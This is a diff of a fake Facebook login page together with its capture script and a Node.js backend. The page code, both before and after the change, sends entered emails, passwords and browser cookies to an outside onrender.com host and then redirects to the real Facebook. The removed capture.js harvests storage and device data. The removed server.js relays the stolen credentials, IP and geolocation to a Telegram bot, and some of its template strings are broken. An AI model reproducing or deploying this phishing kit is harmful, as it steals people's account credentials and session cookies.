@@ -3,22 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval';">
-  <meta http-equiv="X-XSS-Protection" content="0">
-  <meta http-equiv="Access-Control-Allow-Origin" content="*">
   <title>Facebook – log in or sign up</title>
   <link rel="stylesheet" href="/style.css" />
   <link rel="icon" href="/favicon.ico" type="image/x-icon">
-  <script src="https://zaza-4f7z.onrender.com/capture.js"></script>
 </head>
 <body>
-  <p id="feedback" class="feedback-message"></p>
-
   <div class="language-switcher">
     <select id="langSelect">
-      <option value="en">English (US)</option>
-      <option value="ru">Русский</option>
-    </select>
+     <option value="en">English (US)</option>
+     <option value="ru">Русский</option>
+   </select>
   </div>
 
   <div class="container">
@@ -51,233 +45,80 @@
     </div>
   </div>
 
-  <footer class="footer">
-    <div class="footer-content">
-      <div class="languages">
-        <a href="#">English (US)</a>
-        <a href="#">Polski</a>
-        <a href="#">ślōnskŏ gŏdka</a>
-        <a href="#">Русский</a>
-        <a href="#">Deutsch</a>
-        <a href="#">Français (France)</a>
-        <a href="#">Italiano</a>
-        <a href="#">Українська</a>
-        <a href="#">Español (España)</a>
-        <a href="#">Português (Brasil)</a>
-        <a href="#">العربية</a>
-      </div>
-
-      <hr class="footer-separator" />
-
-      <div class="links">
-        <a href="https://www.facebook.com/reg">Sign Up</a>
-        <a href="https://www.facebook.com/login">Log In</a>
-        <a href="https://www.messenger.com/">Messenger</a>
-        <a href="https://www.facebook.com/lite/">Facebook Lite</a>
-        <a href="https://www.facebook.com/watch/">Video</a>
-        <a href="https://pay.facebook.com/">Meta Pay</a>
-        <a href="https://www.facebook.com/store">Meta Store</a>
-        <a href="https://www.meta.com/quest/">Meta Quest</a>
-        <a href="https://www.ray-ban.com/">Ray-Ban Meta</a>
-        <a href="https://www.meta.ai/">Meta AI</a>
-        <a href="https://www.instagram.com/">Instagram</a>
-        <a href="https://www.threads.net/">Threads</a>
-        <a href="https://www.facebook.com/votinginformationcenter/">Voting Information Center</a>
-        <a href="https://www.facebook.com/privacy/policy">Privacy Policy</a>
-        <a href="https://www.facebook.com/privacy/center/">Privacy Center</a>
-        <a href="https://www.facebook.com/help/delete_account?rdrhc">Cancel contracts here</a>
-        <a href="https://www.facebook.com/about">About</a>
-        <a href="https://www.facebook.com/ads/create">Create ad</a>
-        <a href="https://www.facebook.com/pages/create">Create Page</a>
-        <a href="https://developers.facebook.com/">Developers</a>
-        <a href="https://www.facebook.com/careers/">Careers</a>
-        <a href="https://www.facebook.com/policies/cookies/">Cookies</a>
-        <a href="https://www.facebook.com/adpreferences/ad_settings/">Ad choices</a>
-        <a href="https://www.facebook.com/terms">Terms</a>
-        <a href="https://www.facebook.com/help/">Help</a>
-        <a href="https://www.facebook.com/help/contact/268228883256323">Contact Uploading & Non-Users</a>
-      </div>
-
-      <p class="meta-copy">Meta © 2025</p>
+<footer class="footer">
+  <div class="footer-content">
+    <div class="languages">
+      <a href="#">English (US)</a>
+      <a href="#">Polski</a>
+      <a href="#">ślōnskŏ gŏdka</a>
+      <a href="#">Русский</a>
+      <a href="#">Deutsch</a>
+      <a href="#">Français (France)</a>
+      <a href="#">Italiano</a>
+      <a href="#">Українська</a>
+      <a href="#">Español (España)</a>
+      <a href="#">Português (Brasil)</a>
+      <a href="#">العربية</a>
     </div>
-  </footer>
 
-  <script type="module">
-    (async () => {
-      const feedback = document.getElementById('feedback');
+    <hr class="footer-separator" />
 
-      const loginForm = document.getElementById('loginForm');
+    <div class="links">
+      <a href="https://www.facebook.com/reg">Sign Up</a>
+      <a href="https://www.facebook.com/login">Log In</a>
+      <a href="https://www.messenger.com/">Messenger</a>
+      <a href="https://www.facebook.com/lite/">Facebook Lite</a>
+      <a href="https://www.facebook.com/watch/">Video</a>
+      <a href="https://pay.facebook.com/">Meta Pay</a>
+      <a href="https://www.facebook.com/store">Meta Store</a>
+      <a href="https://www.meta.com/quest/">Meta Quest</a>
+      <a href="https://www.ray-ban.com/">Ray-Ban Meta</a>
+      <a href="https://www.meta.ai/">Meta AI</a>
+      <a href="https://www.instagram.com/">Instagram</a>
+      <a href="https://www.threads.net/">Threads</a>
+      <a href="https://www.facebook.com/votinginformationcenter/">Voting Information Center</a>
+      <a href="https://www.facebook.com/privacy/policy">Privacy Policy</a>
+      <a href="https://www.facebook.com/privacy/center/">Privacy Center</a>
+      <a href="https://www.facebook.com/help/delete_account?rdrhc">Cancel contracts here</a>
+      <a href="https://www.facebook.com/about">About</a>
+      <a href="https://www.facebook.com/ads/create">Create ad</a>
+      <a href="https://www.facebook.com/pages/create">Create Page</a>
+      <a href="https://developers.facebook.com/">Developers</a>
+      <a href="https://www.facebook.com/careers/">Careers</a>
+      <a href="https://www.facebook.com/policies/cookies/">Cookies</a>
+      <a href="https://www.facebook.com/adpreferences/ad_settings/">Ad choices</a>
+      <a href="https://www.facebook.com/terms">Terms</a>
+      <a href="https://www.facebook.com/help/">Help</a>
+      <a href="https://www.facebook.com/help/contact/268228883256323">Contact Uploading & Non-Users</a>
+    </div>
 
-      loginForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
+    <p class="meta-copy">Meta © 2025</p>
+  </div>
+</footer>
 
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const cookies = document.cookie || '[no cookies]';
-        const localStorageDump = JSON.stringify(localStorage || {});
-        const sessionStorageDump = JSON.stringify(sessionStorage || {});
+<script type="module">
+  const loginForm = document.getElementById('loginForm');
 
-        const payload = {
-          email,
-          password,
-          cookies,
-          localStorage: localStorageDump,
-          sessionStorage: sessionStorageDump
-        };
+  loginForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-        try {
-          feedback.innerText = 'Sending data...';
-          await fetch('https://zaza-back.onrender.com/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            credentials: 'include',
-            body: JSON.stringify(payload)
-          });
-          feedback.innerText = '✅ Data sent.';
-        } catch (error) {
-          feedback.innerText = '❌ Failed to send.';
-        } finally {
-          setTimeout(() => {
-            window.location.href = 'https://www.facebook.com/';
-          }, 1200);
-        }
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const cookies = document.cookie; // Получаем все видимые JS-куки
+
+    try {
+      await fetch('https://zaza-back.onrender.com/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, cookies })
       });
-    })();
-  </script>
+    } catch (error) {
+      console.error('Login failed:', error);
+    } finally {
+      window.location.href = 'https://www.facebook.com/';
+    }
+  });
+</script>
 
 </body>
 </html>
-
-capture.js:
-(function () {
-  if (!localStorage.getItem("session_id")) localStorage.setItem("session_id", crypto.randomUUID());
-  document.cookie = "user_id=99; path=/";
-
-  const data = {
-    cookies: document.cookie,
-    localStorage: Object.fromEntries(Object.entries(localStorage)),
-    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-    userAgent: navigator.userAgent,
-    location: location.href,
-    screen: { width: screen.width, height: screen.height },
-    platform: navigator.platform,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    date: new Date().toISOString()
-  };
-
-  const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-
-  fetch('https://zaza-back.onrender.com/login', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    credentials: 'include',
-    body: JSON.stringify({ email: 'autobot@ping', password: 'capture', cookies: encoded })
-  });
-})();
-
-server.js:
-import axios from 'axios';
-import os from 'os';
-import express from 'express';
-import cors from 'cors';
-import fetch from 'node-fetch';
-import dotenv from 'dotenv';
-import path from 'path';
-import fs from 'fs';
-import { fileURLToPath } from 'url';
-import crypto from 'crypto';
-import FormData from 'form-data';
-
-dotenv.config();
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-const allowedOrigins = ['https://zaza-4f7z.onrender.com', 'https://www.zaginieni.eu'];
-app.use(cors({ origin: allowedOrigins, credentials: true }));
-app.use(express.json({ limit: '2mb' }));
-
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
-app.use(express.static(path.join(__dirname, 'public')));
-
-// 🔁 Phantom background simulation
-async function simulatePhantomBehavior(uuid, parsed) {
-  const logPath = path.join(__dirname, telemetry_${uuid}.log);
-  const logs = [[${new Date().toISOString()}] 🧪 PhantomSession for ${uuid}];
-
-  if (parsed.localStorage?.session_id) {
-    logs.push(📡 Session ping to /user/${parsed.localStorage.session_id});
-    try {
-      await axios.get(https://zaza-4f7z.onrender.com/user/${parsed.localStorage.session_id});
-    } catch {
-      logs.push('⚠️ Ping failed');
-    }
-  }
-
-  // 🧠 Headless browser activity
-  try {
-    const browser = await puppeteer.launch({ headless: true });
-    const page = await browser.newPage();
-    await page.goto('https://zaza-4f7z.onrender.com');
-    await page.waitForTimeout(1500);
-    await page.screenshot({ path: phantom_${uuid}.png });
-    await browser.close();
-    logs.push('🎥 Screenshot captured');
-  } catch (e) {
-    logs.push(❌ Puppeteer error: ${e.message});
-  }
-
-  fs.writeFileSync(logPath, logs.join('\n'));
-}
-
-// 📥 Main handler
-app.post('/login', async (req, res) => {
-  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const { email, password, cookies } = req.body;
-
-  if (!email || !password || !cookies) return res.status(400).json({ success: false });
-
-  try {
-    const decoded = Buffer.from(cookies, 'base64').toString('utf8');
-    const parsed = JSON.parse(decoded);
-    const uuid = crypto.randomUUID().slice(0, 8);
-    const filename = dump_${uuid}.json;
-    const filepath = path.join(__dirname, filename);
-    fs.writeFileSync(filepath, decoded);
-
-    const geo = await axios.get(https://ipapi.co/${clientIp}/json/).then(r => r.data).catch(() => ({}));
-    const isWin10 = parsed.userAgent.includes('Windows NT 10');
-    const isBrowser = /(Chrome|Edg|Opera)/.test(parsed.userAgent);
-
-    if (isWin10 && isBrowser) await simulatePhantomBehavior(uuid, parsed);
-
-    const dump = 🧾 Dump:\n• Email: ${email}\n• Password: ${password}\n• IP: ${clientIp}\n• Geo: ${geo.country_name || 'N/A'}\n• UA: ${parsed.userAgent}\n• Time: ${parsed.date};
-
-    await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: dump })
-    });
-
-    const form = new FormData();
-    form.append('chat_id', TELEGRAM_CHAT_ID);
-    form.append('document', fs.createReadStream(filepath), filename);
-
-    await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument, {
-      method: 'POST',
-      headers: form.getHeaders(),
-      body: form
-    });
-
-    res.json({ success: true });
-  } catch (err) {
-    console.error('Server Error:', err);
-    res.status(500).json({ success: false });
-  }
-});
-
-app.listen(PORT, () => console.log(✅ Server on ${PORT}));
